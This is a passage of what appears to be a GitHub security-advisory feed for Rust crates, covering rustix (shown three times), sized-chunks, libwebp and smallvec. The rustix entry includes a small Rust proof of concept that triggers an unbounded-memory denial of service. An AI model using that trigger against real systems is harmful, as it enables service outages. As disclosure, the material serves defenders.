<li><a href="https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec">https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6">https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5">https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5</a></li>
<li><a href="https://discord.com/channels/273534239310479360/1161137828395237556">https://discord.com/channels/273534239310479360/1161137828395237556</a></li>
<li><a href="https://github.com/advisories/GHSA-c827-hfw6-qwvm">https://github.com/advisories/GHSA-c827-hfw6-qwvm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c827-hfw6-qwvm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-18T18:27:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rustix] rustix's `rustix::fs::Dir` iterator with the `linux_raw` backend can cause memory explosion]]></title>
        <id>https://github.com/advisories/GHSA-c827-hfw6-qwvm</id>
        <link href="https://github.com/advisories/GHSA-c827-hfw6-qwvm"/>
        <updated>2023-10-18T18:27:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When using <code>rustix::fs::Dir</code> using the <code>linux_raw</code> backend, it's possible for the iterator to "get stuck" when an IO error is encountered. Combined with a memory over-allocation issue in <code>rustix::fs::Dir::read_more</code>, this can cause quick and unbounded memory explosion (gigabytes in a few seconds if used on a hot path) and eventually lead to an OOM crash of the application.</p>
<h3 id="details">Details</h3>
<h4 id="discovery">Discovery</h4>
<p>The symptoms were initially discovered in <a href="https://github.com/imsnif/bandwhich/issues/284">https://github.com/imsnif/bandwhich/issues/284</a>. That post has lots of details of our investigation. See <a href="https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993">this post</a> and the <a href="https://discord.com/channels/273534239310479360/1161137828395237556">Discord thread</a> for details.</p>
<h4 id="diagnosis">Diagnosis</h4>
<p>This issue is caused by the combination of two independent bugs:</p>
<ol>
<li>Stuck iterator</li>
</ol>
<ul>
<li>The <code>rustix::fs::Dir</code> iterator can fail to halt after encountering an IO error, causing the caller to be stuck in an infinite loop.</li>
</ul>
<ol start="2">
<li>Memory over-allocation</li>
</ol>
<ul>
<li><code>Dir::read_more</code> incorrectly grows the read buffer unconditionally each time it is called, regardless of necessity.</li>
</ul>
<p>Since <code>&lt;Dir as Iterator&gt;::next</code> calls <code>Dir::read</code>, which in turn calls <code>Dir::read_more</code>, this means an IO error encountered during reading a directory can lead to rapid and unbounded growth of memory use.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-rust">fn main() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {
    // create a directory, get a FD to it, then unlink the directory but keep the FD
    std::fs::create_dir("tmp_dir")?;
    let dir_fd = rustix::fs::openat(
        rustix::fs::CWD,
        rustix::cstr!("tmp_dir"),
        rustix::fs::OFlags::RDONLY | rustix::fs::OFlags::CLOEXEC,
        rustix::fs::Mode::empty(),
    )?;
    std::fs::remove_dir("tmp_dir")?;

    // iterator gets stuck in infinite loop and memory explodes
    rustix::fs::Dir::read_from(dir_fd)?
        // the iterator keeps returning `Some(Err(_))`, but never halts by returning `None`
        // therefore if the implementation ignores the error (or otherwise continues
        // after seeing the error instead of breaking), the loop will not halt
        .filter_map(|dirent_maybe_error| dirent_maybe_error.ok())
        .for_each(|dirent| {
            // your happy path
            println!("{dirent:?}");
        });

    Ok(())
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>If a program tries to access a directory with its file descriptor after the file has been unlinked (or any other action that leaves the <code>Dir</code> iterator in the stuck state), and the implementation does not break after seeing an error, it can cause a memory explosion.</p>
<p>As an example, Linux's various virtual file systems (e.g. <code>/proc</code>, <code>/sys</code>) can contain directories that spontaneously pop in and out of existence. Attempting to iterate over them using <code>rustix::fs::Dir</code> directly or indirectly (e.g. with the <code>procfs</code> crate) can trigger this fault condition if the implementation decides to continue on errors.</p>
<p>An attacker knowledgeable about the implementation details of a vulnerable target can therefore try to trigger this fault condition via any one or a combination of several available APIs. If successful, the application host will quickly run out of memory, after which the application will likely be terminated by an OOM killer, leading to denial of service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm">https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm</a></li>
<li><a href="https://github.com/imsnif/bandwhich/issues/284">https://github.com/imsnif/bandwhich/issues/284</a></li>
<li><a href="https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993">https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159">https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec">https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6">https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5">https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5</a></li>
<li><a href="https://discord.com/channels/273534239310479360/1161137828395237556">https://discord.com/channels/273534239310479360/1161137828395237556</a></li>
<li><a href="https://github.com/advisories/GHSA-c827-hfw6-qwvm">https://github.com/advisories/GHSA-c827-hfw6-qwvm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c827-hfw6-qwvm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-18T18:27:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rustix] rustix's `rustix::fs::Dir` iterator with the `linux_raw` backend can cause memory explosion]]></title>
        <id>https://github.com/advisories/GHSA-c827-hfw6-qwvm</id>
        <link href="https://github.com/advisories/GHSA-c827-hfw6-qwvm"/>
        <updated>2023-10-18T18:27:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When using <code>rustix::fs::Dir</code> using the <code>linux_raw</code> backend, it's possible for the iterator to "get stuck" when an IO error is encountered. Combined with a memory over-allocation issue in <code>rustix::fs::Dir::read_more</code>, this can cause quick and unbounded memory explosion (gigabytes in a few seconds if used on a hot path) and eventually lead to an OOM crash of the application.</p>
<h3 id="details">Details</h3>
<h4 id="discovery">Discovery</h4>
<p>The symptoms were initially discovered in <a href="https://github.com/imsnif/bandwhich/issues/284">https://github.com/imsnif/bandwhich/issues/284</a>. That post has lots of details of our investigation. See <a href="https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993">this post</a> and the <a href="https://discord.com/channels/273534239310479360/1161137828395237556">Discord thread</a> for details.</p>
<h4 id="diagnosis">Diagnosis</h4>
<p>This issue is caused by the combination of two independent bugs:</p>
<ol>
<li>Stuck iterator</li>
</ol>
<ul>
<li>The <code>rustix::fs::Dir</code> iterator can fail to halt after encountering an IO error, causing the caller to be stuck in an infinite loop.</li>
</ul>
<ol start="2">
<li>Memory over-allocation</li>
</ol>
<ul>
<li><code>Dir::read_more</code> incorrectly grows the read buffer unconditionally each time it is called, regardless of necessity.</li>
</ul>
<p>Since <code>&lt;Dir as Iterator&gt;::next</code> calls <code>Dir::read</code>, which in turn calls <code>Dir::read_more</code>, this means an IO error encountered during reading a directory can lead to rapid and unbounded growth of memory use.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-rust">fn main() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {
    // create a directory, get a FD to it, then unlink the directory but keep the FD
    std::fs::create_dir("tmp_dir")?;
    let dir_fd = rustix::fs::openat(
        rustix::fs::CWD,
        rustix::cstr!("tmp_dir"),
        rustix::fs::OFlags::RDONLY | rustix::fs::OFlags::CLOEXEC,
        rustix::fs::Mode::empty(),
    )?;
    std::fs::remove_dir("tmp_dir")?;

    // iterator gets stuck in infinite loop and memory explodes
    rustix::fs::Dir::read_from(dir_fd)?
        // the iterator keeps returning `Some(Err(_))`, but never halts by returning `None`
        // therefore if the implementation ignores the error (or otherwise continues
        // after seeing the error instead of breaking), the loop will not halt
        .filter_map(|dirent_maybe_error| dirent_maybe_error.ok())
        .for_each(|dirent| {
            // your happy path
            println!("{dirent:?}");
        });

    Ok(())
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>If a program tries to access a directory with its file descriptor after the file has been unlinked (or any other action that leaves the <code>Dir</code> iterator in the stuck state), and the implementation does not break after seeing an error, it can cause a memory explosion.</p>
<p>As an example, Linux's various virtual file systems (e.g. <code>/proc</code>, <code>/sys</code>) can contain directories that spontaneously pop in and out of existence. Attempting to iterate over them using <code>rustix::fs::Dir</code> directly or indirectly (e.g. with the <code>procfs</code> crate) can trigger this fault condition if the implementation decides to continue on errors.</p>
<p>An attacker knowledgeable about the implementation details of a vulnerable target can therefore try to trigger this fault condition via any one or a combination of several available APIs. If successful, the application host will quickly run out of memory, after which the application will likely be terminated by an OOM killer, leading to denial of service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm">https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm</a></li>
<li><a href="https://github.com/imsnif/bandwhich/issues/284">https://github.com/imsnif/bandwhich/issues/284</a></li>
<li><a href="https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993">https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159">https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec">https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6">https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5">https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5</a></li>
<li><a href="https://discord.com/channels/273534239310479360/1161137828395237556">https://discord.com/channels/273534239310479360/1161137828395237556</a></li>
<li><a href="https://github.com/advisories/GHSA-c827-hfw6-qwvm">https://github.com/advisories/GHSA-c827-hfw6-qwvm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c827-hfw6-qwvm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-18T18:27:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rustix] rustix's `rustix::fs::Dir` iterator with the `linux_raw` backend can cause memory explosion]]></title>
        <id>https://github.com/advisories/GHSA-c827-hfw6-qwvm</id>
        <link href="https://github.com/advisories/GHSA-c827-hfw6-qwvm"/>
        <updated>2023-10-18T18:27:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When using <code>rustix::fs::Dir</code> using the <code>linux_raw</code> backend, it's possible for the iterator to "get stuck" when an IO error is encountered. Combined with a memory over-allocation issue in <code>rustix::fs::Dir::read_more</code>, this can cause quick and unbounded memory explosion (gigabytes in a few seconds if used on a hot path) and eventually lead to an OOM crash of the application.</p>
<h3 id="details">Details</h3>
<h4 id="discovery">Discovery</h4>
<p>The symptoms were initially discovered in <a href="https://github.com/imsnif/bandwhich/issues/284">https://github.com/imsnif/bandwhich/issues/284</a>. That post has lots of details of our investigation. See <a href="https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993">this post</a> and the <a href="https://discord.com/channels/273534239310479360/1161137828395237556">Discord thread</a> for details.</p>
<h4 id="diagnosis">Diagnosis</h4>
<p>This issue is caused by the combination of two independent bugs:</p>
<ol>
<li>Stuck iterator</li>
</ol>
<ul>
<li>The <code>rustix::fs::Dir</code> iterator can fail to halt after encountering an IO error, causing the caller to be stuck in an infinite loop.</li>
</ul>
<ol start="2">
<li>Memory over-allocation</li>
</ol>
<ul>
<li><code>Dir::read_more</code> incorrectly grows the read buffer unconditionally each time it is called, regardless of necessity.</li>
</ul>
<p>Since <code>&lt;Dir as Iterator&gt;::next</code> calls <code>Dir::read</code>, which in turn calls <code>Dir::read_more</code>, this means an IO error encountered during reading a directory can lead to rapid and unbounded growth of memory use.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-rust">fn main() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {
    // create a directory, get a FD to it, then unlink the directory but keep the FD
    std::fs::create_dir("tmp_dir")?;
    let dir_fd = rustix::fs::openat(
        rustix::fs::CWD,
        rustix::cstr!("tmp_dir"),
        rustix::fs::OFlags::RDONLY | rustix::fs::OFlags::CLOEXEC,
        rustix::fs::Mode::empty(),
    )?;
    std::fs::remove_dir("tmp_dir")?;

    // iterator gets stuck in infinite loop and memory explodes
    rustix::fs::Dir::read_from(dir_fd)?
        // the iterator keeps returning `Some(Err(_))`, but never halts by returning `None`
        // therefore if the implementation ignores the error (or otherwise continues
        // after seeing the error instead of breaking), the loop will not halt
        .filter_map(|dirent_maybe_error| dirent_maybe_error.ok())
        .for_each(|dirent| {
            // your happy path
            println!("{dirent:?}");
        });

    Ok(())
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>If a program tries to access a directory with its file descriptor after the file has been unlinked (or any other action that leaves the <code>Dir</code> iterator in the stuck state), and the implementation does not break after seeing an error, it can cause a memory explosion.</p>
<p>As an example, Linux's various virtual file systems (e.g. <code>/proc</code>, <code>/sys</code>) can contain directories that spontaneously pop in and out of existence. Attempting to iterate over them using <code>rustix::fs::Dir</code> directly or indirectly (e.g. with the <code>procfs</code> crate) can trigger this fault condition if the implementation decides to continue on errors.</p>
<p>An attacker knowledgeable about the implementation details of a vulnerable target can therefore try to trigger this fault condition via any one or a combination of several available APIs. If successful, the application host will quickly run out of memory, after which the application will likely be terminated by an OOM killer, leading to denial of service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm">https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm</a></li>
<li><a href="https://github.com/imsnif/bandwhich/issues/284">https://github.com/imsnif/bandwhich/issues/284</a></li>
<li><a href="https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993">https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159">https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec">https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6">https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5">https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5</a></li>
<li><a href="https://discord.com/channels/273534239310479360/1161137828395237556">https://discord.com/channels/273534239310479360/1161137828395237556</a></li>
<li><a href="https://github.com/advisories/GHSA-c827-hfw6-qwvm">https://github.com/advisories/GHSA-c827-hfw6-qwvm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c827-hfw6-qwvm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-18T18:27:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sized-chunks] Array size is not checked in sized-chunks]]></title>
        <id>https://github.com/advisories/GHSA-mp6f-p9gp-vpj9</id>
        <link href="https://github.com/advisories/GHSA-mp6f-p9gp-vpj9"/>
        <updated>2023-10-10T19:27:06.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in the sized-chunks crate through 0.6.2 for Rust. In the Chunk implementation, the array size is not checked when constructed with pair().</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-25792">https://nvd.nist.gov/vuln/detail/CVE-2020-25792</a></li>
<li><a href="https://github.com/bodil/sized-chunks/issues/11">https://github.com/bodil/sized-chunks/issues/11</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2020-0041.html">https://rustsec.org/advisories/RUSTSEC-2020-0041.html</a></li>
<li><a href="https://github.com/bodil/sized-chunks/commit/3ae48bd463c1af41c24b96b84079946f51f51e3c">https://github.com/bodil/sized-chunks/commit/3ae48bd463c1af41c24b96b84079946f51f51e3c</a></li>
<li><a href="https://github.com/bodil/sized-chunks/commit/99e593c3037438db478256a1f3101371a69cbd3f">https://github.com/bodil/sized-chunks/commit/99e593c3037438db478256a1f3101371a69cbd3f</a></li>
<li><a href="https://github.com/advisories/GHSA-mp6f-p9gp-vpj9">https://github.com/advisories/GHSA-mp6f-p9gp-vpj9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mp6f-p9gp-vpj9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-08-25T20:46:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[webp] libwebp: OOB write in BuildHuffmanTable]]></title>
        <id>https://github.com/advisories/GHSA-j7hp-h8jx-5ppr</id>
        <link href="https://github.com/advisories/GHSA-j7hp-h8jx-5ppr"/>
        <updated>2023-11-05T05:01:18.000Z</updated>
        <content type="html"><![CDATA[<p>Heap buffer overflow in libwebp allow a remote attacker to perform an out of bounds memory write via a crafted HTML page. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-4863">https://nvd.nist.gov/vuln/detail/CVE-2023-4863</a></li>
<li><a href="https://chromereleases.googleblog.com/2023/09/stable-channel-update-for-desktop_11.html">https://chromereleases.googleblog.com/2023/09/stable-channel-update-for-desktop_11.html</a></li>
<li><a href="https://crbug.com/1479274">https://crbug.com/1479274</a></li>
<li><a href="https://github.com/qnighy/libwebp-sys2-rs/pull/21">https://github.com/qnighy/libwebp-sys2-rs/pull/21</a></li>
<li><a href="https://github.com/qnighy/libwebp-sys2-rs/commit/4560c473a76ec8bd8c650f19ddf9d7a44f719f8b">https://github.com/qnighy/libwebp-sys2-rs/commit/4560c473a76ec8bd8c650f19ddf9d7a44f719f8b</a></li>
<li><a href="https://github.com/webmproject/libwebp/commit/902bc9190331343b2017211debcec8d2ab87e17a">https://github.com/webmproject/libwebp/commit/902bc9190331343b2017211debcec8d2ab87e17a</a></li>
<li><a href="https://bugzilla.suse.com/show_bug.cgi?id=1215231">https://bugzilla.suse.com/show_bug.cgi?id=1215231</a></li>
<li><a href="https://en.bandisoft.com/honeyview/history/">https://en.bandisoft.com/honeyview/history/</a></li>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-4863">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-4863</a></li>
<li><a href="https://news.ycombinator.com/item?id=37478403">https://news.ycombinator.com/item?id=37478403</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0060.html">https://rustsec.org/advisories/RUSTSEC-2023-0060.html</a></li>
<li><a href="https://security-tracker.debian.org/tracker/CVE-2023-4863">https://security-tracker.debian.org/tracker/CVE-2023-4863</a></li>
<li><a href="https://stackdiary.com/critical-vulnerability-in-webp-codec-cve-2023-4863/">https://stackdiary.com/critical-vulnerability-in-webp-codec-cve-2023-4863/</a></li>
<li><a href="https://www.bleepingcomputer.com/news/google/google-fixes-another-chrome-zero-day-bug-exploited-in-attacks/">https://www.bleepingcomputer.com/news/google/google-fixes-another-chrome-zero-day-bug-exploited-in-attacks/</a></li>
<li><a href="https://www.mozilla.org/en-US/security/advisories/mfsa2023-40/">https://www.mozilla.org/en-US/security/advisories/mfsa2023-40/</a></li>
<li><a href="https://github.com/electron/electron/pull/39823">https://github.com/electron/electron/pull/39823</a></li>
<li><a href="https://github.com/electron/electron/pull/39825">https://github.com/electron/electron/pull/39825</a></li>
<li><a href="https://github.com/electron/electron/pull/39826">https://github.com/electron/electron/pull/39826</a></li>
<li><a href="https://github.com/electron/electron/pull/39827">https://github.com/electron/electron/pull/39827</a></li>
<li><a href="https://github.com/electron/electron/pull/39828">https://github.com/electron/electron/pull/39828</a></li>
<li><a href="https://adamcaudill.com/2023/09/14/whose-cve-is-it-anyway/">https://adamcaudill.com/2023/09/14/whose-cve-is-it-anyway/</a></li>
<li><a href="https://github.com/webmproject/libwebp/releases/tag/v1.3.2">https://github.com/webmproject/libwebp/releases/tag/v1.3.2</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2023/09/msg00015.html">https://lists.debian.org/debian-lts-announce/2023/09/msg00015.html</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2023/09/msg00016.html">https://lists.debian.org/debian-lts-announce/2023/09/msg00016.html</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2023/09/msg00017.html">https://lists.debian.org/debian-lts-announce/2023/09/msg00017.html</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6T655QF7CQ3DYAMPFV7IECQYGDEUIVVT/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6T655QF7CQ3DYAMPFV7IECQYGDEUIVVT/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FYYKLG6CRGEDTNRBSU26EEWAO6D6U645/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FYYKLG6CRGEDTNRBSU26EEWAO6D6U645/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/OZDGWWMJREPAGKWCJKSCM4WYLANSKIFX/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/OZDGWWMJREPAGKWCJKSCM4WYLANSKIFX/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PYZV7TMKF4QHZ54SFJX54BDN52VHGGCX/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PYZV7TMKF4QHZ54SFJX54BDN52VHGGCX/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WHOLML7N2G5KCAZXFWC5IDFFHSQS5SDB/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WHOLML7N2G5KCAZXFWC5IDFFHSQS5SDB/</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0061.html">https://rustsec.org/advisories/RUSTSEC-2023-0061.html</a></li>
<li><a href="https://security.gentoo.org/glsa/202309-05">https://security.gentoo.org/glsa/202309-05</a></li>
<li><a href="https://www.debian.org/security/2023/dsa-5496">https://www.debian.org/security/2023/dsa-5496</a></li>
<li><a href="https://www.debian.org/security/2023/dsa-5497">https://www.debian.org/security/2023/dsa-5497</a></li>
<li><a href="https://www.debian.org/security/2023/dsa-5498">https://www.debian.org/security/2023/dsa-5498</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KUQ7CTX3W372X3UY56VVNAHCH6H2F4X3/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KUQ7CTX3W372X3UY56VVNAHCH6H2F4X3/</a></li>
<li><a href="https://blog.isosceles.com/the-webp-0day/">https://blog.isosceles.com/the-webp-0day/</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/21/4">http://www.openwall.com/lists/oss-security/2023/09/21/4</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/22/1">http://www.openwall.com/lists/oss-security/2023/09/22/1</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/22/3">http://www.openwall.com/lists/oss-security/2023/09/22/3</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/22/4">http://www.openwall.com/lists/oss-security/2023/09/22/4</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/22/5">http://www.openwall.com/lists/oss-security/2023/09/22/5</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/22/6">http://www.openwall.com/lists/oss-security/2023/09/22/6</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/22/7">http://www.openwall.com/lists/oss-security/2023/09/22/7</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/22/8">http://www.openwall.com/lists/oss-security/2023/09/22/8</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/26/1">http://www.openwall.com/lists/oss-security/2023/09/26/1</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/26/7">http://www.openwall.com/lists/oss-security/2023/09/26/7</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/28/1">http://www.openwall.com/lists/oss-security/2023/09/28/1</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/28/2">http://www.openwall.com/lists/oss-security/2023/09/28/2</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/28/4">http://www.openwall.com/lists/oss-security/2023/09/28/4</a></li>
<li><a href="https://github.com/jaredforth/webp/pull/30">https://github.com/jaredforth/webp/pull/30</a></li>
<li><a href="https://github.com/python-pillow/Pillow/pull/7395">https://github.com/python-pillow/Pillow/pull/7395</a></li>
<li><a href="https://github.com/jaredforth/webp/commit/9d4c56e63abecc777df71c702503c3eaabd7dcbc">https://github.com/jaredforth/webp/commit/9d4c56e63abecc777df71c702503c3eaabd7dcbc</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WTRUIS3564P7ZLM2S2IH4Y4KZ327LI4I/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WTRUIS3564P7ZLM2S2IH4Y4KZ327LI4I/</a></li>
<li><a href="https://pillow.readthedocs.io/en/stable/releasenotes/10.0.1.html#security">https://pillow.readthedocs.io/en/stable/releasenotes/10.0.1.html#security</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20230929-0011/">https://security.netapp.com/advisory/ntap-20230929-0011/</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/discussions/6664">https://github.com/ImageMagick/ImageMagick/discussions/6664</a></li>
<li><a href="https://github.com/dlemstra/Magick.NET/releases/tag/13.3.0">https://github.com/dlemstra/Magick.NET/releases/tag/13.3.0</a></li>
<li><a href="https://github.com/advisories/GHSA-j7hp-h8jx-5ppr">https://github.com/advisories/GHSA-j7hp-h8jx-5ppr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j7hp-h8jx-5ppr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-09-12T15:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[smallvec] Use of Uninitialized Resource in smallvec]]></title>
        <id>https://github.com/advisories/GHSA-55m5-whcv-c49c</id>
        <link href="https://github.com/advisories/GHSA-55m5-whcv-c49c"/>
        <updated>2023-10-02T23:32:50.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions of this crate called mem::uninitialized() to create values of a user-supplied type T. This is unsound e.g. if T is a reference type (which must be non-null and thus may not remain uninitialized). The flaw was corrected by avoiding the use of mem::uninitialized(), using MaybeUninit instead.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-25023">https://nvd.nist.gov/vuln/detail/CVE-2018-25023</a></li>
<li><a href="https://raw.githubusercontent.com/rustsec/advisory-db/main/crates/smallvec/RUSTSEC-2018-0018.md">https://raw.githubusercontent.com/rustsec/advisory-db/main/crates/smallvec/RUSTSEC-2018-0018.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2018-0018.html">https://rustsec.org/advisories/RUSTSEC-2018-0018.html</a></li>
<li><a href="https://github.com/servo/rust-smallvec/issues/126">https://github.com/servo/rust-smallvec/issues/126</a></li>
<li><a href="https://github.com/servo/rust-smallvec/pull/162">https://github.com/servo/rust-smallvec/pull/162</a></li>
